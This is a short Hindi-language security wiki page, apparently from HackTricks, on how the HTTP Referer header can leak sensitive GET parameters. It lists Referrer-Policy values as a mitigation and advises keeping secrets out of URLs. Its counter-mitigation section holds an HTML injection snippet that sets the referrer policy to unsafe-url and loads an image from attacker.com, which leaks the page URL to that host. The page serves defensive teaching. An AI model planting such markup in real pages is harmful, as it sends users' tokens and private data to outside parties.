# Interesting HTTP

{{#include ../banners/hacktricks-training.md}}

## Referrer headers और policy

Referrer वह header है जिसका उपयोग browsers यह बताने के लिए करते हैं कि पिछला visit किया गया page कौन-सा था।

### Sensitive information leak

यदि किसी web page के अंदर किसी बिंदु पर GET request parameters में कोई sensitive information मौजूद है, और page में external sources के links हैं या attacker user को attacker द्वारा नियंत्रित URL पर visit करने के लिए प्रेरित/सुझाव देने (social engineering) में सक्षम है, तो latest GET request के अंदर मौजूद sensitive information को exfiltrate किया जा सकता है।

### Mitigation

आप browser को एक **Referrer-policy** follow करने के लिए configure कर सकते हैं, जो **sensitive information** को अन्य web applications पर भेजे जाने से **रोक सकती है**:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
### Counter-Mitigation

आप इस नियम को एक HTML meta tag का उपयोग करके override कर सकते हैं (attacker को HTML injection exploit करना होगा):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## रक्षा

URL में GET parameters या paths के अंदर कभी भी कोई sensitive data न रखें।

{{#include ../banners/hacktricks-training.md}}
